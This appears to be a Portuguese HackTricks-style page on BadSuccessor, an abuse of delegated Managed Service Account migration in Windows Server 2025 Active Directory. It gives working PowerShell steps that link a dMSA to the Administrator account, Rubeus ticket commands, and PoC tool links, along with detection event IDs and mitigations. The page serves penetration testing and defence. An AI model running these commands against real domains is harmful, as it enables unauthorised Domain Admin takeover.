# BadSuccessor: Escalonamento de Privilégios via Abuso da Migração de MSA Delegada

{{#include ../../banners/hacktricks-training.md}}

## Visão geral

As Managed Service Accounts delegadas (**dMSA**) são as sucessoras de próxima geração das **gMSA**, disponibilizadas no Windows Server 2025. Um fluxo de migração legítimo permite que administradores substituam uma conta *antiga* (de usuário, computador ou serviço) por uma dMSA, preservando as permissões de forma transparente. O fluxo é exposto por cmdlets do PowerShell, como `Start-ADServiceAccountMigration` e `Complete-ADServiceAccountMigration`, e depende de dois atributos LDAP do **objeto dMSA**:

* **`msDS-ManagedAccountPrecededByLink`** – *link DN* para a conta substituída (antiga).
* **`msDS-DelegatedMSAState`**       – estado da migração (`0` = nenhum, `1` = em andamento, `2` = *concluída*).<sup>[[1]](#references)</sup>

Se um atacante puder criar qualquer dMSA dentro de uma OU e manipular diretamente esses 2 atributos, o LSASS e o KDC tratarão a dMSA como *sucessora* da conta vinculada. Quando o atacante se autenticar posteriormente como a dMSA, **herdará todos os privilégios da conta vinculada** – até **Domain Admin** se a conta Administrator estiver vinculada.<sup>[[1]](#references)</sup>

Essa técnica foi denominada **BadSuccessor** pela Unit 42 em 2025. No momento da redação, **nenhum patch de segurança** está disponível; apenas o hardening das permissões da OU mitiga o problema.<sup>[[1]](#references)[[2]](#references)</sup>

### Pré-requisitos do ataque

1. Uma conta que tenha permissão para criar objetos dentro de **uma Organizational Unit (OU)** *e* tenha pelo menos uma das seguintes permissões:
* `Create Child` → classe de objeto **`msDS-DelegatedManagedServiceAccount`**
* `Create Child` → **`All Objects`** (criação genérica)
2. Conectividade de rede com LDAP e Kerberos (cenário padrão de máquina ingressada no domínio / ataque remoto).<sup>[[1]](#references)</sup>

## Enumerando OUs vulneráveis

A Unit 42 lançou um script auxiliar do PowerShell que analisa os security descriptors de cada OU e destaca as ACEs necessárias:<sup>[[1]](#references)</sup>
```powershell
Get-BadSuccessorOUPermissions.ps1 -Domain contoso.local
```
Nos bastidores, o script executa uma pesquisa LDAP paginada por `(objectClass=organizationalUnit)` e verifica cada `nTSecurityDescriptor` em busca de

* `ADS_RIGHT_DS_CREATE_CHILD` (0x0001)
* `Active Directory Schema ID: 31ed51fa-77b1-4175-884a-5c6f3f6f34e8` (object class *msDS-DelegatedManagedServiceAccount*)

## Etapas da Exploração

Depois que uma OU gravável é identificada, o ataque requer apenas 3 gravações LDAP:<sup>[[1]](#references)</sup>
```powershell
# 1. Create a new delegated MSA inside the delegated OU
New-ADServiceAccount -Name attacker_dMSA \
-DNSHostName host.contoso.local \
-Path "OU=DelegatedOU,DC=contoso,DC=com"

# 2. Point the dMSA to the target account (e.g. Domain Admin)
Set-ADServiceAccount attacker_dMSA -Add \
@{msDS-ManagedAccountPrecededByLink="CN=Administrator,CN=Users,DC=contoso,DC=com"}

# 3. Mark the migration as *completed*
Set-ADServiceAccount attacker_dMSA -Replace @{msDS-DelegatedMSAState=2}
```
Após a replicação, o atacante pode simplesmente fazer **logon** como `attacker_dMSA$` ou solicitar um Kerberos TGT – o Windows criará o token da conta *superseded*.<sup>[[1]](#references)</sup>

### Automação

Vários PoCs públicos automatizam todo o workflow, incluindo a recuperação de senha e o gerenciamento de tickets:

* SharpSuccessor (C#) – [https://github.com/logangoins/SharpSuccessor](https://github.com/logangoins/SharpSuccessor)<sup>[[3]](#references)</sup>
* BadSuccessor.ps1 (PowerShell) – [https://github.com/LuemmelSec/Pentest-Tools-Collection/blob/main/tools/ActiveDirectory/BadSuccessor.ps1](https://github.com/LuemmelSec/Pentest-Tools-Collection/blob/main/tools/ActiveDirectory/BadSuccessor.ps1)<sup>[[4]](#references)</sup>
* NetExec module – `badsuccessor` (Python) – [https://github.com/Pennyw0rth/NetExec](https://github.com/Pennyw0rth/NetExec)<sup>[[5]](#references)</sup>

### Post-Exploitation
```powershell
# Request a TGT for the dMSA and inject it (Rubeus)
Rubeus asktgt /user:attacker_dMSA$ /password:<ClearTextPwd> /domain:contoso.local
Rubeus ptt /ticket:<Base64TGT>

# Access Domain Admin resources
dir \\DC01\C$
```
## Detecção e Hunting

Habilite a **Auditoria de Objetos** nas OUs e monitore os seguintes Eventos de Segurança do Windows:<sup>[[1]](#references)[[2]](#references)</sup>

* **5137** – Criação do objeto **dMSA**
* **5136** – Modificação de **`msDS-ManagedAccountPrecededByLink`**
* **4662** – Alterações específicas de atributos
* GUID `2f5c138a-bd38-4016-88b4-0ec87cbb4919` → `msDS-DelegatedMSAState`
* GUID `a0945b2b-57a2-43bd-b327-4d112a4e8bd1` → `msDS-ManagedAccountPrecededByLink`
* **2946** – Emissão de TGT para o dMSA

Correlacionar `4662` (modificação de atributo), `4741` (criação de uma conta de computador/serviço) e `4624` (logon subsequente) destaca rapidamente atividades do BadSuccessor. Soluções XDR, como o **XSIAM**, incluem consultas prontas para uso (consulte as referências).<sup>[[2]](#references)</sup>

## Mitigação

* Aplique o princípio do **menor privilégio** – delegue o gerenciamento de *Service Account* somente a funções confiáveis.
* Remova `Create Child` / `msDS-DelegatedManagedServiceAccount` das OUs que não exigem isso explicitamente.
* Monitore os IDs de evento listados acima e gere alertas quando identidades *non-Tier-0* criarem ou editarem dMSAs.

## Veja também


{{#ref}}
golden-dmsa-gmsa.md
{{#endref}}

## Referências

- [1] [BadSuccessor: Abusando de dMSA para Escalar Privilégios no Active Directory – Akamai](https://www.akamai.com/blog/security-research/abusing-dmsa-for-privilege-escalation-in-active-directory)
- [2] [Unit42 – Quando Contas Boas se Tornam Ruins: Explorando Delegated Managed Service Accounts](https://unit42.paloaltonetworks.com/badsuccessor-attack-vector/)
- [3] [SharpSuccessor PoC](https://github.com/logangoins/SharpSuccessor)
- [4] [BadSuccessor.ps1 – Pentest-Tools-Collection](https://github.com/LuemmelSec/Pentest-Tools-Collection/blob/main/tools/ActiveDirectory/BadSuccessor.ps1)
- [5] [Módulo BadSuccessor do NetExec](https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/badsuccessor.py)

{{#include ../../banners/hacktricks-training.md}}
